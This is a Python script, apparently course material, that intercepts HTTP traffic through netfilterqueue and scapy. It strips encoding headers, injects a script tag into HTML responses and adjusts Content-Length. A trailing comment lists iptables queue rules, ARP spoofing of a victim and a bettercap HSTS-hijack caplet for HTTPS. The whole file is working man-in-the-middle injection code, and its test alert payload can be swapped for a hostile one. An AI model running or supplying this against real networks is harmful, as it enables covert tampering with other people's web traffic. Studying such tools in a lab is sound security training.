import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load_data):
    packet[scapy.Raw].load = load_data
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    # chksum and length contains the length and the data type of the packet .We have to delete it to prevent our modified packet from error
    return packet



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    try:
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            load = scapy_packet[scapy.Raw].load.decode()

            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Encoding:.*?\\r\\n", "", load)


            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                injection_code = "<script>alert('test');</script>"
                load = load.replace("</body>", injection_code + "</body>")
                # Add capital body if statement



                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_contant_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_contant_length))

            if load != scapy_packet[scapy.Raw].load:
                new_load = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_load))

        packet.accept()

    except UnicodeDecodeError:
        pass

queue = netfilterqueue.NetfilterQueue()  #Keeps all the data or requests in the queue
queue.bind(2, process_packet)

try:
    queue.run()

except KeyboardInterrupt:
    print("\n[-] Ctrl+C detected")
    print("[-] Quiting")




"""
HTTP ->
remote computer -> iptables -I FORWARD -j NFQUEUE --queue-num_inp 0
                -> ARP spoofing for that compuet ip

self computer -> iptables -I OUTPUT -j NFQUEUE --queue-num_inp 0
              -> iptables -I INPUT -j NFQUEUE --queue-num_inp 0


HTTPS -> 
remote computer -> iptables -I FORWARD -j NFQUEUE --queue-num_inp 0
                -> ARP spoofing for that compuet ip
                -> bettercap -iface wlan0 -caplet hstshijack/hstshijack


self computer -> iptables -I OUTPUT -j NFQUEUE --queue-num_inp 0
              -> iptables -I INPUT -j NFQUEUE --queue-num_inp 0
              -> bettercap -iface wlan0 -caplet hstshijack/hstshijack

"""